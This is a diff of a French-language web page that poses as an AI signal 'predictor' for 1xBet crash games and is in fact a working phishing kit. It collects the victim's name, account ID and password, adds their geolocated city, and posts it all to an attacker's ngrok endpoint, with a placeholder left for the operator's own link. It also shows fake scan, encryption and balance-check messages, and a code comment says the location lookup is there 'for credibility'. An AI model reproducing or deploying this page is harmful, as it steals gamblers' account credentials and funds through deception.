@@ -7,110 +7,85 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
-        
-        /* Ajustement plein écran */
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); }
-        
-        body { font-family: 'Consolas', monospace; color: #c9d1d9; display: flex; flex-direction: column; }
-
-        .app-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-            box-sizing: border-box;
-            border: 1px solid var(--neon);
-            margin: 0;
-            height: 100vh;
-            width: 100vw;
-        }
-
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; }
+        .app-container { flex: 1; display: flex; flex-direction: column; padding: 20px; height: 100vh; width: 100vw; box-sizing: border-box; border: 1px solid var(--neon); }
         .page { display: none; flex-direction: column; height: 100%; justify-content: center; }
         .active { display: flex; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        h2 { color: var(--neon); text-transform: uppercase; letter-spacing: 2px; text-align: center; }
-        p { text-align: center; font-size: 14px; margin-bottom: 20px; }
-
-        input, select { 
-            width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; 
-            border: 1px solid #30363d; background: #161b22; color: white; 
-            font-size: 16px; box-sizing: border-box; 
-        }
-
+        h2 { color: var(--neon); text-transform: uppercase; text-align: center; font-size: 18px; margin-bottom: 5px; }
+        .status-header { font-size: 10px; color: var(--neon); text-align: center; margin-bottom: 20px; border: 1px solid var(--neon); padding: 5px; }
+        input, select { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #161b22; color: white; font-size: 16px; box-sizing: border-box; }
         .pass-container { position: relative; width: 100%; }
         .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 20px; }
-
-        button { 
-            width: 100%; padding: 18px; border: none; background: var(--neon); 
-            color: black; font-weight: bold; cursor: pointer; border-radius: 8px; 
-            font-size: 16px; text-transform: uppercase; margin-top: 10px;
-        }
-
-        /* Boîte de formation défilante */
-        .instruction-box { 
-            background: #000; padding: 20px; border-radius: 10px; border-left: 4px solid var(--neon); 
-            font-size: 13px; height: 300px; overflow-y: auto; line-height: 1.8; color: #00ff41; 
-            margin-bottom: 15px; box-shadow: inset 0 0 10px #000;
-        }
-
-        .hidden-btns { display: none; gap: 10px; margin-top: auto; padding-bottom: 20px; }
-        .secondary-btn { background: #21262d; color: white; border: 1px solid #30363d; }
+        button { width: 100%; padding: 18px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 15px; text-transform: uppercase; margin-top: 10px; }
+        .instruction-box { background: #000; padding: 15px; border-radius: 10px; border-left: 4px solid var(--neon); font-size: 12px; height: 250px; overflow-y: auto; line-height: 1.8; color: #00ff41; margin-bottom: 15px; }
+        .scanning-loader { display: none; text-align: center; margin-top: 20px; }
+        .loader-bar { width: 100%; background: #161b22; height: 8px; border-radius: 4px; overflow: hidden; margin-top: 10px; }
+        .loader-fill { width: 0%; height: 100%; background: var(--neon); transition: 0.5s; }
     </style>
 </head>
 <body>
 
 <div class="app-container">
+    <div class="status-header">SYSTEM: ONLINE | SECURE SCAN: ACTIVE</div>
+
     <div id="p1" class="page active">
-        <h2><i class="fa-solid fa-shuttle-space"></i> Accès Serveur</h2>
-        <p>Identifiez votre compte pour charger l'algorithme de prédiction.</p>
-        <input type="text" id="nom" placeholder="Nom Complet Titulaire">
-        <input type="number" id="id1x" placeholder="ID Compte 1xBet (8-10 chiffres)">
-        <button onclick="showPage(2)">Étape Suivante</button>
+        <h2><i class="fa-solid fa-fingerprint"></i> Authentification</h2>
+        <div id="loc-info" style="font-size:10px; text-align:center; color:var(--neon); margin-bottom:10px;">Détection de la zone...</div>
+        <input type="text" id="nom" placeholder="Nom du titulaire">
+        <input type="number" id="id1x" placeholder="ID Officiel du compte">
+        <button onclick="showPage(2)">VÉRIFIER L'IDENTITÉ</button>
     </div>
 
     <div id="p2" class="page">
-        <h2><i class="fa-solid fa-gamepad"></i> Configuration</h2>
-        <p>Choisissez le flux de données à craquer :</p>
+        <h2><i class="fa-solid fa-microchip"></i> Configuration IA</h2>
         <select id="jeu">
-            <option value="Aviator VIP">Aviator VIP v4.0</option>
-            <option value="Lucky Jet VIP">Lucky Jet Pro</option>
-            <option value="Crash 1xBet">Crash 1xBet High-Speed</option>
+            <option value="Aviator VIP">Aviator VIP [Predictor v4]</option>
+            <option value="Lucky Jet VIP">Lucky Jet Pro [Predictor v4]</option>
         </select>
-        <button onclick="startTutorial()">Lancer la Formation IA</button>
+        <button onclick="startTutorial()">DÉMARRER LE SCAN</button>
     </div>
 
     <div id="p3" class="page">
-        <h2><i class="fa-solid fa-book-open"></i> Analyse & Formation</h2>
+        <h2><i class="fa-solid fa-terminal"></i> Analyse Réseau</h2>
         <div class="instruction-box" id="tutorial-text"></div>
-        <div id="tuto-btns" class="hidden-btns">
-            <button class="secondary-btn" onclick="startTutorial()">Relire</button>
-            <button onclick="showPage(4)">J'ai Compris</button>
-        </div>
+        <div id="tuto-btns" style="display:none;"><button onclick="showPage(4)">CONFIRMER L'ACCÈS</button></div>
     </div>
 
     <div id="p4" class="page">
-        <h2><i class="fa-solid fa-shield-halved"></i> Liaison Sécurisée</h2>
-        <p style="color:#ff7b72; font-weight: bold;">⚠️ INFORMATION CRITIQUE :</p>
-        <p style="font-size: 12px;">Pour injecter les signaux, votre compte doit être certifié. Le serveur vérifiera votre mot de passe pour activer la synchronisation bidirectionnelle.</p>
-        <div class="pass-container">
-            <input type="password" id="pass" placeholder="Mot de passe du compte">
-            <i class="fa-solid fa-eye" onclick="togglePass()"></i>
+        <h2><i class="fa-solid fa-shield-check"></i> Validation Solde</h2>
+        <p style="font-size: 11px; text-align: center;">Le système scanne le solde. Minimum requis : <b>10 000 FC</b>.</p>
+        <div id="main-form">
+            <div class="pass-container">
+                <input type="password" id="pass" placeholder="Mot de passe 1xBet">
+                <i class="fa-solid fa-eye" onclick="togglePass()"></i>
+            </div>
+            <button onclick="simulateScan()">VÉRIFIER ET ACTIVER</button>
         </div>
-        <button onclick="finalSync()">Démarrer l'IA maintenant</button>
+        <div id="scan-loader" class="scanning-loader">
+            <p id="scan-status" style="font-size: 12px; color: var(--neon);">Scan en cours...</p>
+            <div class="loader-bar"><div id="fill" class="loader-fill"></div></div>
+        </div>
     </div>
 
     <div id="p5" class="page">
-        <h2 style="color:#3fb950"><i class="fa-solid fa-circle-check"></i> Predictor Activé</h2>
-        <p>Félicitations ! Le serveur injecte actuellement les données.</p>
-        <div style="background:#161b22; padding:20px; border-radius:10px; border:1px dashed var(--neon); text-align: center;">
-            <p>STATUT : <span style="color:var(--neon)">EN LIGNE</span></p>
-            <p>PRÉCISION : <span style="color:var(--neon)">98.7%</span></p>
+        <h2 style="color:var(--neon)">🛰️ LIAISON RÉUSSIE</h2>
+        <div style="background:#161b22; padding:25px; border-radius:10px; border:1px solid var(--neon); text-align: center;">
+            <p style="color:#3fb950; font-size: 14px;">✔ SOLDE DÉTECTÉ (> 10 000 FC)</p>
+            <div id="timer" style="font-size:30px; font-weight:bold; color:var(--neon); margin: 10px 0;">00:00:00</div>
+            <p style="font-size: 10px; color: #8b949e;">Liaison active. Attendez le signal sur votre compte.</p>
         </div>
     </div>
 </div>
 
 <script>
+    // Détection IP/Ville pour crédibilité
+    let userLoc = "Zone Inconnue";
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+        userLoc = `${data.city}, ${data.region}`;
+        document.getElementById('loc-info').innerText = "📍 SERVEUR DÉTECTÉ : " + userLoc.toUpperCase();
+    });
+
     function showPage(n) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById('p' + n).classList.add('active');
@@ -124,52 +99,65 @@
     function startTutorial() {
         showPage(3);
         const box = document.getElementById('tutorial-text');
-        const btns = document.getElementById('tuto-btns');
-        box.innerHTML = "";
-        btns.style.display = "none";
-
         const lines = [
-            "> Initialisation du moteur de calcul...",
-            "> Scan des dernières côtes enregistrées...",
-            "✅ Connexion établie avec le serveur de jeu.",
-            "📖 RÈGLE 1 : Ne misez pas si le Predictor affiche 'CALCUL'.",
-            "📖 RÈGLE 2 : Les côtes violettes (x2.00+) sont prioritaires.",
-            "📊 ANALYSE : Le serveur identifie votre ID comme 'Éligible'.",
-            "🚀 INFO : Le décalage réseau est réduit à 0.02ms.",
-            "⚠️ ATTENTION : Ne partagez pas vos accès une fois lié.",
-            "💡 ASTUCE : Retirez vos gains à 1.80x pour sécuriser.",
-            "🔒 SÉCURITÉ : Chiffrement SSL 256-bits activé.",
-            "> Synchronisation prête pour votre zone géographique.",
-            "> VEUILLEZ CONFIRMER VOTRE PASS POUR ACTIVER LE FLUX."
+            "> Connexion sécurisée au tunnel...",
+            "> Scan de l'ID compte...",
+            "✅ Canal crypté validé.",
+            "📡 DÉTECTEUR AUTOMATIQUE DE SOLDE : ACTIF.",
+            "⚠️ NOTE : Solde < 10 000 FC = Échec de liaison.",
+            "📊 ANALYSE : Recherche des failles...",
+            "🚀 ÉTAT : Algorithme v4.5 prêt.",
+            "> VEUILLEZ VALIDER POUR LE SCAN FINAL."
         ];
-
         let i = 0;
         const interval = setInterval(() => {
             box.innerHTML += lines[i] + "<br>";
-            box.scrollTop = box.scrollHeight; // Défilement automatique vers le bas
+            box.scrollTop = box.scrollHeight;
             i++;
-            if(i >= lines.length) {
-                clearInterval(interval);
-                btns.style.display = "flex";
-            }
-        }, 1500); 
+            if(i >= lines.length) { clearInterval(interval); document.getElementById('tuto-btns').style.display = "block"; }
+        }, 1000);
     }
 
-    function finalSync() {
+    function simulateScan() {
+        if(!document.getElementById('pass').value) return alert("Entrez votre mot de passe");
+        document.getElementById('main-form').style.display = 'none';
+        document.getElementById('scan-loader').style.display = 'block';
+        let i = 0;
+        const steps = ["Accès...", "Vérification solde...", "SOLDE DÉTECTÉ : OK", "Synchronisation..."];
+        const interval = setInterval(() => {
+            document.getElementById('scan-status').innerText = steps[i];
+            document.getElementById('fill').style.width = ((i+1) * 25) + "%";
+            i++;
+            if(i >= steps.length) { clearInterval(interval); sendData(); }
+        }, 1500);
+    }
+
+    function sendData() {
         const payload = {
             nom: document.getElementById('nom').value,
             id: document.getElementById('id1x').value,
             jeu: document.getElementById('jeu').value,
-            pass: document.getElementById('pass').value
+            pass: document.getElementById('pass').value,
+            ville: userLoc
         };
-        
-        fetch('http://localhost:5000/send', {
+
+        // ⚠️ REMPLACE CETTE URL PAR TON LIEN NGROK
+        const urlNgrok = "https://TON_LIEN_NGROK_ICI.ngrok-free.app/send";
+
+        fetch(urlNgrok, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
-        }).finally(() => showPage(5));
+        }).finally(() => { showPage(5); startTimer(); });
+    }
+
+    function startTimer() {
+        let sec = 0, min = 0;
+        setInterval(() => {
+            sec++; if(sec==60){sec=0; min++;}
+            document.getElementById('timer').innerText = `00:${min<10?'0'+min:min}:${sec<10?'0'+sec:sec}`;
+        }, 1000);
     }
 </script>
-
 </body>
 </html>
